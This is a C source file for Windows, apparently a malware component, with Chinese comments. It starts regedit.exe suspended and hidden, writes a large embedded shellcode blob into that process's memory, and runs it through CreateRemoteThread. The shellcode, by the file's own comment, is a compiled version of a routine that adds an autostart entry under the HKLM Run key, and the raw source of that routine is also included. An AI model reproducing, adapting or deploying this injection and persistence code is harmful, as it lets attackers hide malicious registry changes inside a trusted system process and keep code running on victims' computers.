#include <windows.h>

DWORD openRegEdit()
{
	SYSTEM_INFO s;
	GetSystemInfo(&s);
	char* path;
	if (s.wProcessorArchitecture == 9 || s.wProcessorArchitecture == 6)
		path = "C:\\Windows\\Syswow64\\regedit.exe";
	else
		path = "C:\\Windows\\regedit.exe";

	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOA si = { 0 };

	si.cb = sizeof(si);
	DWORD pid = CreateProcessA(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);//以挂起的方式创建进程

	if (pid != 0)
		pid = pi.dwProcessId;

	return pid;
}

int inject(DWORD pid, LPVOID param) {
	//这段shellcode是根据addRunOnceReg函数以该脚本生成的，故可以循环嵌套使用。
	unsigned char buf[] = "\x55\x8b\xec\x83\xec\x08\xe8\x2c\x00\x00\x00\x89\x45\xfc\x8b\x45\xfc\x25\x00\xf0\xff\xff\x89\x45\xf8\x8b\x4d\xf8\x51\xe8\x1d\x00\x00\x00\x83\xc4\x04\x8b\x55\x08\x52\xe8\x0f\x04\x00\x00\x83\xc4\x04\x33\xc0\x8b\xe5\x5d\xc3\x55\x8b\xec\x8b\x45\x04\x5d\xc3\x55\x8b\xec\x83\xec\x2c\xc7\x45\xe0\x34\x0c\x00\x00\xc7\x45\xd4\x64\x0c\x00\x00\x81\x7d\xe0\x99\x99\x99\x99\x74\x3f\x8b\x45\xe0\x89\x45\xf4\xeb\x09\x8b\x4d\xf4\x83\xc1\x02\x89\x4d\xf4\x8b\x55\xf4\x3b\x55\xd4\x77\x26\x0f\xae\xe8\x8b\x45\x08\x03\x45\xf4\x0f\xb7\x08\x8b\x55\x08\x8b\x04\x0a\x03\x45\x08\x8b\x4d\x08\x03\x4d\xf4\x0f\xb7\x11\x8b\x4d\x08\x89\x04\x11\xeb\xc9\xc7\x45\xdc\xb8\x0b\x00\x00\xc7\x45\xe8\x1c\x0c\x00\x00\x81\x7d\xdc\x77\x77\x77\x77\x0f\x84\xe5\x00\x00\x00\xe8\xe4\x00\x00\x00\x8b\x55\x08\x03\x55\xdc\x89\x55\xf8\xc7\x45\xe4\x01\x00\x00\x00\xc7\x45\xf0\x00\x00\x00\x00\xb8\x01\x00\x00\x00\x85\xc0\x0f\x84\xbc\x00\x00\x00\x83\x7d\xe4\x00\x74\x3c\x8b\x4d\xf8\x89\x4d\xec\x8b\x55\xec\x52\xff\x15\x40\x0b\x00\x00\x89\x45\xf0\x83\x7d\xf0\x00\x75\x0d\x8b\x45\xec\x50\xff\x15\x44\x0b\x00\x00\x89\x45\xf0\x8b\x4d\xec\x51\xe8\x9e\x02\x00\x00\x83\xc4\x04\x8b\x55\xf8\x8d\x44\x02\x01\x89\x45\xf8\x8b\x4d\xf8\x8a\x11\x88\x55\xff\x0f\xb6\x45\xff\x83\xf8\x2c\x75\x47\x8b\x4d\xf8\x83\xc1\x01\x89\x4d\xd8\x8b\x55\xd8\x52\x8b\x45\xf0\x50\xff\x15\x48\x0b\x00\x00\x8b\x4d\x08\x03\x4d\xe8\x89\x01\x8b\x55\xe8\x83\xc2\x04\x89\x55\xe8\x8b\x45\xd8\x50\xe8\x4f\x02\x00\x00\x83\xc4\x04\x8b\x4d\xf8\x8d\x54\x01\x02\x89\x55\xf8\xc7\x45\xe4\x00\x00\x00\x00\xeb\x1d\x0f\xb6\x45\xff\x83\xf8\x3b\x75\x12\x8b\x4d\xf8\x83\xc1\x01\x89\x4d\xf8\xc7\x45\xe4\x01\x00\x00\x00\xeb\x02\xeb\x05\xe9\x37\xff\xff\xff\x8b\xe5\x5d\xc3\x55\x8b\xec\x51\xe8\x39\x00\x00\x00\x89\x45\xfc\xe8\x6f\x00\x00\x00\xa3\x48\x0b\x00\x00\x68\x4c\x0b\x00\x00\x8b\x45\xfc\x50\xff\x15\x48\x0b\x00\x00\xa3\x40\x0b\x00\x00\x68\x60\x0b\x00\x00\x8b\x4d\xfc\x51\xff\x15\x48\x0b\x00\x00\xa3\x44\x0b\x00\x00\x8b\xe5\x5d\xc3\x55\x8b\xec\x83\xec\x08\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc7\x45\xf8\x00\x00\x00\x00\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x40\x14\x8b\x00\x8b\x00\x8b\x40\x10\x89\x45\xf8\x8b\x45\xf8\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x8b\xe5\x5d\xc3\x55\x8b\xec\x83\xec\x3c\xe8\xb7\xff\xff\xff\x89\x45\xfc\x8b\x45\xfc\x89\x45\xe8\x8b\x4d\xe8\x8b\x51\x3c\x03\x55\xfc\x89\x55\xe4\x8b\x45\xe4\x83\xc0\x78\x89\x45\xe0\x8b\x4d\xe0\x8b\x55\xfc\x03\x11\x89\x55\xf4\x8b\x45\xf4\x8b\x48\x14\x89\x4d\xdc\x8b\x55\xf4\x8b\x42\x18\x89\x45\xd8\x8b\x4d\xf4\x8b\x51\x1c\x03\x55\xfc\x89\x55\xec\x8b\x45\xf4\x8b\x48\x20\x03\x4d\xfc\x89\x4d\xd0\x8b\x55\xf4\x8b\x42\x24\x03\x45\xfc\x89\x45\xd4\xc7\x45\xf8\x00\x00\x00\x00\xeb\x09\x8b\x4d\xf8\x83\xc1\x01\x89\x4d\xf8\x8b\x55\xf8\x3b\x55\xdc\x73\x7f\x8b\x45\xf8\x8b\x4d\xec\x83\x3c\x81\x00\x75\x02\xeb\xe1\x8b\x55\xf8\x8b\x45\xec\x8b\x0c\x90\x89\x4d\xc4\xc7\x45\xf0\x00\x00\x00\x00\xeb\x09\x8b\x55\xf0\x83\xc2\x01\x89\x55\xf0\x8b\x45\xf0\x3b\x45\xd8\x73\x46\x8b\x4d\xf0\x8b\x55\xd4\x0f\xb7\x04\x4a\x3b\x45\xf8\x75\x35\x0f\xae\xe8\x8b\x4d\xf0\x8b\x55\xd0\x8b\x04\x8a\x89\x45\xcc\x8b\x4d\xfc\x03\x4d\xcc\x89\x4d\xc8\x68\x70\x0b\x00\x00\x8b\x55\xc8\x52\xe8\x1a\x00\x00\x00\x83\xc4\x08\x85\xc0\x75\x08\x8b\x45\xc4\x03\x45\xfc\xeb\x07\xeb\xa9\xe9\x70\xff\xff\xff\x8b\xe5\x5d\xc3\x8b\x54\x24\x04\x8b\x4c\x24\x08\xf7\xc2\x03\x00\x00\x00\x75\x40\x8b\x02\x3a\x01\x75\x32\x84\xc0\x74\x26\x3a\x61\x01\x75\x29\x84\xe4\x74\x1d\xc1\xe8\x10\x3a\x41\x02\x75\x1d\x84\xc0\x74\x11\x3a\x61\x03\x75\x14\x83\xc1\x04\x83\xc2\x04\x84\xe4\x75\xd2\x8b\xff\x33\xc0\xc3\xeb\x03\xcc\xcc\xcc\x1b\xc0\x83\xc8\x01\xc3\x8b\xff\xf7\xc2\x01\x00\x00\x00\x74\x18\x8a\x02\x83\xc2\x01\x3a\x01\x75\xe7\x83\xc1\x01\x84\xc0\x74\xd8\xf7\xc2\x02\x00\x00\x00\x74\xa0\x66\x8b\x02\x83\xc2\x02\x3a\x01\x75\xce\x84\xc0\x74\xc2\x3a\x61\x01\x75\xc5\x84\xe4\x74\xb9\x83\xc1\x02\xeb\x84\x8b\x4c\x24\x04\xf7\xc1\x03\x00\x00\x00\x74\x24\x8a\x01\x83\xc1\x01\x84\xc0\x74\x4e\xf7\xc1\x03\x00\x00\x00\x75\xef\x05\x00\x00\x00\x00\x8d\xa4\x24\x00\x00\x00\x00\x8d\xa4\x24\x00\x00\x00\x00\x8b\x01\xba\xff\xfe\xfe\x7e\x03\xd0\x83\xf0\xff\x33\xc2\x83\xc1\x04\xa9\x00\x01\x01\x81\x74\xe8\x8b\x41\xfc\x84\xc0\x74\x32\x84\xe4\x74\x24\xa9\x00\x00\xff\x00\x74\x13\xa9\x00\x00\x00\xff\x74\x02\xeb\xcd\x8d\x41\xff\x8b\x4c\x24\x04\x2b\xc1\xc3\x8d\x41\xfe\x8b\x4c\x24\x04\x2b\xc1\xc3\x8d\x41\xfd\x8b\x4c\x24\x04\x2b\xc1\xc3\x8d\x41\xfc\x8b\x4c\x24\x04\x2b\xc1\xc3\x55\x8b\xec\x83\xec\x54\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x56\x57\xb9\x0b\x00\x00\x00\xbe\x80\x0b\x00\x00\x8d\x7d\xcc\xf3\xa5\x66\xa5\x8b\x45\x08\x50\xe8\x49\xff\xff\xff\x83\xc4\x04\x89\x45\xac\xc7\x45\xc4\x00\x00\x00\x00\xc7\x45\xc0\x00\x00\x00\x00\xc7\x45\xbc\x00\x00\x00\x00\xeb\x09\x8b\x4d\xc4\x83\xc1\x01\x89\x4d\xc4\x8b\x55\xc4\x3b\x55\xac\x0f\x8d\x87\x00\x00\x00\x8b\x45\x08\x03\x45\xc4\x0f\xbe\x08\x83\xf9\x3b\x75\x74\x8b\x55\x08\x03\x55\xc4\x0f\xbe\x42\x01\x83\xf8\x3b\x75\x65\x68\xff\x00\x00\x00\x6a\x00\xff\x15\x1c\x0c\x00\x00\x50\xff\x15\x20\x0c\x00\x00\x8b\x4d\xc0\x89\x44\x8d\xb0\x8b\x55\xc4\x2b\x55\xbc\x52\x8b\x45\x08\x03\x45\xbc\x50\x8b\x4d\xc0\x8b\x54\x8d\xb0\x52\xe8\xdd\x00\x00\x00\x83\xc4\x0c\x8b\x45\xc4\x2b\x45\xbc\x8b\x4d\xc0\x8b\x54\x8d\xb0\xc6\x04\x02\x00\x8b\x45\xc4\x83\xc0\x02\x89\x45\xbc\x8b\x4d\xc0\x83\xc1\x01\x89\x4d\xc0\x8b\x55\xc4\x83\xc2\x01\x89\x55\xc4\xe9\x64\xff\xff\xff\x68\xb8\x0b\x00\x00\xff\x15\x24\x0c\x00\x00\x8d\x45\xc8\x50\x68\x02\x01\x00\x00\x6a\x00\x8d\x4d\xcc\x51\x68\x02\x00\x00\x80\xff\x15\x28\x0c\x00\x00\x89\x45\xb8\x83\x7d\xb8\x00\x74\x07\xb8\x01\x00\x00\x00\xeb\x64\xba\x04\x00\x00\x00\xc1\xe2\x00\x8b\x44\x15\xb0\x50\xe8\x49\xfe\xff\xff\x83\xc4\x04\x50\xb9\x04\x00\x00\x00\xc1\xe1\x00\x8b\x54\x0d\xb0\x52\x6a\x01\x6a\x00\xb8\x04\x00\x00\x00\x6b\xc8\x00\x8b\x54\x0d\xb0\x52\x8b\x45\xc8\x50\xff\x15\x2c\x0c\x00\x00\x89\x45\xb8\x83\x7d\xb8\x00\x74\x11\x8b\x4d\xc8\x51\xff\x15\x30\x0c\x00\x00\xb8\x01\x00\x00\x00\xeb\x0c\x8b\x55\xc8\x52\xff\x15\x30\x0c\x00\x00\x33\xc0\x5f\x5e\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x8b\xe5\x5d\xc3\x57\x56\x8b\x74\x24\x10\x8b\x4c\x24\x14\x8b\x7c\x24\x0c\x8b\xc1\x8b\xd1\x03\xc6\x3b\xfe\x76\x08\x3b\xf8\x0f\x82\x94\x02\x00\x00\x83\xf9\x20\x0f\x82\xd2\x04\x00\x00\x81\xf9\x80\x00\x00\x00\x73\x13\x0f\xba\x25\xb0\x0b\x00\x00\x01\x0f\x82\x8e\x04\x00\x00\xe9\xe3\x01\x00\x00\x0f\xba\x25\xb4\x0b\x00\x00\x01\x73\x09\xf3\xa4\x8b\x44\x24\x0c\x5e\x5f\xc3\x8b\xc7\x33\xc6\xa9\x0f\x00\x00\x00\x75\x0e\x0f\xba\x25\xb0\x0b\x00\x00\x01\x0f\x82\xe0\x03\x00\x00\x0f\xba\x25\xb4\x0b\x00\x00\x00\x0f\x83\xa9\x01\x00\x00\xf7\xc7\x03\x00\x00\x00\x0f\x85\x9d\x01\x00\x00\xf7\xc6\x03\x00\x00\x00\x0f\x85\xac\x01\x00\x00\x0f\xba\xe7\x02\x73\x0d\x8b\x06\x83\xe9\x04\x8d\x76\x04\x89\x07\x8d\x7f\x04\x0f\xba\xe7\x03\x73\x11\xf3\x0f\x7e\x0e\x83\xe9\x08\x8d\x76\x08\x66\x0f\xd6\x0f\x8d\x7f\x08\xf7\xc6\x07\x00\x00\x00\x74\x65\x0f\xba\xe6\x03\x0f\x83\xb4\x00\x00\x00\x66\x0f\x6f\x4e\xf4\x8d\x76\xf4\x8b\xff\x66\x0f\x6f\x5e\x10\x83\xe9\x30\x66\x0f\x6f\x46\x20\x66\x0f\x6f\x6e\x30\x8d\x76\x30\x83\xf9\x30\x66\x0f\x6f\xd3\x66\x0f\x3a\x0f\xd9\x0c\x66\x0f\x7f\x1f\x66\x0f\x6f\xe0\x66\x0f\x3a\x0f\xc2\x0c\x66\x0f\x7f\x47\x10\x66\x0f\x6f\xcd\x66\x0f\x3a\x0f\xec\x0c\x66\x0f\x7f\x6f\x20\x8d\x7f\x30\x73\xb7\x8d\x76\x0c\xe9\xaf\x00\x00\x00\x66\x0f\x6f\x4e\xf8\x8d\x76\xf8\x8d\x49\x00\x66\x0f\x6f\x5e\x10\x83\xe9\x30\x66\x0f\x6f\x46\x20\x66\x0f\x6f\x6e\x30\x8d\x76\x30\x83\xf9\x30\x66\x0f\x6f\xd3\x66\x0f\x3a\x0f\xd9\x08\x66\x0f\x7f\x1f\x66\x0f\x6f\xe0\x66\x0f\x3a\x0f\xc2\x08\x66\x0f\x7f\x47\x10\x66\x0f\x6f\xcd\x66\x0f\x3a\x0f\xec\x08\x66\x0f\x7f\x6f\x20\x8d\x7f\x30\x73\xb7\x8d\x76\x08\xeb\x56\x66\x0f\x6f\x4e\xfc\x8d\x76\xfc\x8b\xff\x66\x0f\x6f\x5e\x10\x83\xe9\x30\x66\x0f\x6f\x46\x20\x66\x0f\x6f\x6e\x30\x8d\x76\x30\x83\xf9\x30\x66\x0f\x6f\xd3\x66\x0f\x3a\x0f\xd9\x04\x66\x0f\x7f\x1f\x66\x0f\x6f\xe0\x66\x0f\x3a\x0f\xc2\x04\x66\x0f\x7f\x47\x10\x66\x0f\x6f\xcd\x66\x0f\x3a\x0f\xec\x04\x66\x0f\x7f\x6f\x20\x8d\x7f\x30\x73\xb7\x8d\x76\x04\x83\xf9\x10\x72\x13\xf3\x0f\x6f\x0e\x83\xe9\x10\x8d\x76\x10\x66\x0f\x7f\x0f\x8d\x7f\x10\xeb\xe8\x0f\xba\xe1\x02\x73\x0d\x8b\x06\x83\xe9\x04\x8d\x76\x04\x89\x07\x8d\x7f\x04\x0f\xba\xe1\x03\x73\x11\xf3\x0f\x7e\x0e\x83\xe9\x08\x8d\x76\x08\x66\x0f\xd6\x0f\x8d\x7f\x08\x8b\x04\x8d\xc4\x2a\x00\x10\xff\xe0\xf7\xc7\x03\x00\x00\x00\x74\x13\x8a\x06\x88\x07\x49\x83\xc6\x01\x83\xc7\x01\xf7\xc7\x03\x00\x00\x00\x75\xed\x8b\xd1\x83\xf9\x20\x0f\x82\xae\x02\x00\x00\xc1\xe9\x02\xf3\xa5\x83\xe2\x03\xff\x24\x95\xc4\x2a\x00\x10\xff\x24\x8d\xd4\x2a\x00\x10\x90\xd4\x2a\x00\x10\xdc\x2a\x00\x10\xe8\x2a\x00\x10\xfc\x2a\x00\x10\x8b\x44\x24\x0c\x5e\x5f\xc3\x90\x8a\x06\x88\x07\x8b\x44\x24\x0c\x5e\x5f\xc3\x90\x8a\x06\x88\x07\x8a\x46\x01\x88\x47\x01\x8b\x44\x24\x0c\x5e\x5f\xc3\x8d\x49\x00\x8a\x06\x88\x07\x8a\x46\x01\x88\x47\x01\x8a\x46\x02\x88\x47\x02\x8b\x44\x24\x0c\x5e\x5f\xc3\x90\x8d\x34\x0e\x8d\x3c\x0f\x83\xf9\x20\x0f\x82\x51\x01\x00\x00\x0f\xba\x25\xb0\x0b\x00\x00\x01\x0f\x82\x94\x00\x00\x00\xf7\xc7\x03\x00\x00\x00\x74\x14\x8b\xd7\x83\xe2\x03\x2b\xca\x8a\x46\xff\x88\x47\xff\x4e\x4f\x83\xea\x01\x75\xf3\x83\xf9\x20\x0f\x82\x1e\x01\x00\x00\x8b\xd1\xc1\xe9\x02\x83\xe2\x03\x83\xee\x04\x83\xef\x04\xfd\xf3\xa5\xfc\xff\x24\x95\x70\x2b\x00\x10\x90\x80\x2b\x00\x10\x88\x2b\x00\x10\x98\x2b\x00\x10\xac\x2b\x00\x10\x8b\x44\x24\x0c\x5e\x5f\xc3\x90\x8a\x46\x03\x88\x47\x03\x8b\x44\x24\x0c\x5e\x5f\xc3\x8d\x49\x00\x8a\x46\x03\x88\x47\x03\x8a\x46\x02\x88\x47\x02\x8b\x44\x24\x0c\x5e\x5f\xc3\x90\x8a\x46\x03\x88\x47\x03\x8a\x46\x02\x88\x47\x02\x8a\x46\x01\x88\x47\x01\x8b\x44\x24\x0c\x5e\x5f\xc3\xf7\xc7\x0f\x00\x00\x00\x74\x0f\x49\x4e\x4f\x8a\x06\x88\x07\xf7\xc7\x0f\x00\x00\x00\x75\xf1\x81\xf9\x80\x00\x00\x00\x72\x68\x81\xee\x80\x00\x00\x00\x81\xef\x80\x00\x00\x00\xf3\x0f\x6f\x06\xf3\x0f\x6f\x4e\x10\xf3\x0f\x6f\x56\x20\xf3\x0f\x6f\x5e\x30\xf3\x0f\x6f\x66\x40\xf3\x0f\x6f\x6e\x50\xf3\x0f\x6f\x76\x60\xf3\x0f\x6f\x7e\x70\xf3\x0f\x7f\x07\xf3\x0f\x7f\x4f\x10\xf3\x0f\x7f\x57\x20\xf3\x0f\x7f\x5f\x30\xf3\x0f\x7f\x67\x40\xf3\x0f\x7f\x6f\x50\xf3\x0f\x7f\x77\x60\xf3\x0f\x7f\x7f\x70\x81\xe9\x80\x00\x00\x00\xf7\xc1\x80\xff\xff\xff\x75\x90\x83\xf9\x20\x72\x23\x83\xee\x20\x83\xef\x20\xf3\x0f\x6f\x06\xf3\x0f\x6f\x4e\x10\xf3\x0f\x7f\x07\xf3\x0f\x7f\x4f\x10\x83\xe9\x20\xf7\xc1\xe0\xff\xff\xff\x75\xdd\xf7\xc1\xfc\xff\xff\xff\x74\x15\x83\xef\x04\x83\xee\x04\x8b\x06\x89\x07\x83\xe9\x04\xf7\xc1\xfc\xff\xff\xff\x75\xeb\x85\xc9\x74\x0f\x83\xef\x01\x83\xee\x01\x8a\x06\x88\x07\x83\xe9\x01\x75\xf1\x8b\x44\x24\x0c\x5e\x5f\xc3\xeb\x03\xcc\xcc\xcc\x8b\xc6\x83\xe0\x0f\x85\xc0\x0f\x85\xe3\x00\x00\x00\x8b\xd1\x83\xe1\x7f\xc1\xea\x07\x74\x66\x8d\xa4\x24\x00\x00\x00\x00\x8b\xff\x66\x0f\x6f\x06\x66\x0f\x6f\x4e\x10\x66\x0f\x6f\x56\x20\x66\x0f\x6f\x5e\x30\x66\x0f\x7f\x07\x66\x0f\x7f\x4f\x10\x66\x0f\x7f\x57\x20\x66\x0f\x7f\x5f\x30\x66\x0f\x6f\x66\x40\x66\x0f\x6f\x6e\x50\x66\x0f\x6f\x76\x60\x66\x0f\x6f\x7e\x70\x66\x0f\x7f\x67\x40\x66\x0f\x7f\x6f\x50\x66\x0f\x7f\x77\x60\x66\x0f\x7f\x7f\x70\x8d\xb6\x80\x00\x00\x00\x8d\xbf\x80\x00\x00\x00\x4a\x75\xa3\x85\xc9\x74\x5f\x8b\xd1\xc1\xea\x05\x85\xd2\x74\x21\x8d\x9b\x00\x00\x00\x00\xf3\x0f\x6f\x06\xf3\x0f\x6f\x4e\x10\xf3\x0f\x7f\x07\xf3\x0f\x7f\x4f\x10\x8d\x76\x20\x8d\x7f\x20\x4a\x75\xe5\x83\xe1\x1f\x74\x30\x8b\xc1\xc1\xe9\x02\x74\x0f\x8b\x16\x89\x17\x83\xc7\x04\x83\xc6\x04\x83\xe9\x01\x75\xf1\x8b\xc8\x83\xe1\x03\x74\x13\x8a\x06\x88\x07\x46\x47\x49\x75\xf7\x8d\xa4\x24\x00\x00\x00\x00\x8d\x49\x00\x8b\x44\x24\x0c\x5e\x5f\xc3\x8d\xa4\x24\x00\x00\x00\x00\x8b\xff\xba\x10\x00\x00\x00\x2b\xd0\x2b\xca\x51\x8b\xc2\x8b\xc8\x83\xe1\x03\x74\x09\x8a\x16\x88\x17\x46\x47\x49\x75\xf7\xc1\xe8\x02\x74\x0d\x8b\x16\x89\x17\x8d\x76\x04\x8d\x7f\x04\x48\x75\xf3\x59\xe9\xe9\xfe\xff\xff\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x47\x65\x74\x4d\x6f\x64\x75\x6c\x65\x48\x61\x6e\x64\x6c\x65\x41\x00\x00\x00\x00\x4c\x6f\x61\x64\x4c\x69\x62\x72\x61\x72\x79\x41\x00\x00\x00\x00\x47\x65\x74\x50\x72\x6f\x63\x41\x64\x64\x72\x65\x73\x73\x00\x00\x53\x4f\x46\x54\x57\x41\x52\x45\x5c\x4d\x69\x63\x72\x6f\x73\x6f\x66\x74\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x43\x75\x72\x72\x65\x6e\x74\x56\x65\x72\x73\x69\x6f\x6e\x5c\x52\x75\x6e\x00\x00\x00\x01\x00\x00\x00\xff\xff\xff\xff\x4b\x45\x52\x4e\x45\x4c\x33\x32\x00\x2c\x47\x65\x74\x50\x72\x6f\x63\x65\x73\x73\x48\x65\x61\x70\x00\x2c\x48\x65\x61\x70\x41\x6c\x6c\x6f\x63\x00\x2c\x53\x6c\x65\x65\x70\x00\x3b\x41\x44\x56\x41\x50\x49\x33\x32\x00\x2c\x52\x65\x67\x4f\x70\x65\x6e\x4b\x65\x79\x45\x78\x41\x00\x2c\x52\x65\x67\x53\x65\x74\x56\x61\x6c\x75\x65\x45\x78\x41\x00\x2c\x52\x65\x67\x43\x6c\x6f\x73\x65\x4b\x65\x79\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x01\x91\x08\x12\x06\xff\x02\x91\x05\xa4\x05\x29\x05\x30\x06\xb1\x01\xb5\x05\xb6\x01\x3e\x06\xc0\x01\xc1\x04\x43\x05\xc5\x01\x45\x01\xc8\x04\xca\x01\xd4\x01\x55\x04\xd9\x01\xf1\x00\xff\x05";

	HANDLE Process = OpenProcess((DWORD)PROCESS_ALL_ACCESS, (BOOL)FALSE, pid);
	if (Process == NULL)
		return 1;

	void * paramAddr = VirtualAllocEx(Process, NULL, strlen(param), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (param == NULL)
		return 1;

	BOOL Memory = WriteProcessMemory((HANDLE)Process, (LPVOID)paramAddr, (LPCVOID)param, strlen(param), NULL);
	if (Memory == 0)
		return 1;

	void * exec = VirtualAllocEx(Process, NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (exec == NULL)
		return 1;

	Memory = WriteProcessMemory((HANDLE)Process, (LPVOID)exec, (LPCVOID)buf, sizeof(buf), NULL);
	if (Memory == 0)
		return 1;

	HANDLE thred = CreateRemoteThread((HANDLE)Process, (LPSECURITY_ATTRIBUTES)NULL, (SIZE_T)0, (LPTHREAD_START_ROUTINE)exec, paramAddr, (DWORD)0, (LPDWORD)NULL);
	if (thred == NULL)
		return 1;

	return 0;
}

void runRegEditAndInject(LPVOID param)
{
	DWORD pid = openRegEdit();
	if (pid != 0)
		inject(pid, param);

	ExitProcess(0);

	return 0;
}

int addRunOnceReg(char* param) {
	HKEY hKey;
	char lpSubKey[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	char* reg[2];
	int length = strlen(param);

	for (int i = 0, j = 0, index = 0; i < length; i++)
	{
		if (param[i] == ';'&&param[i + 1] == ';')
		{
			reg[j] = HeapAlloc(GetProcessHeap(), 0, 255);
			memcpy(reg[j], (param + index), i - index);
			reg[j][i - index] = '\x0';
			index = i + 2;
			j++;
			i++;
		}
	}

	Sleep(1000 * 3);

	LONG lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE, lpSubKey, 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey);
	if (lResult != ERROR_SUCCESS)
		return 1;

	lResult = RegSetValueExA(hKey, reg[0], 0, REG_SZ, reg[1], strlen(reg[1]));
	if (lResult != ERROR_SUCCESS) {
		RegCloseKey(hKey);
		return 1;
	}

	RegCloseKey(hKey);

	return 0;
}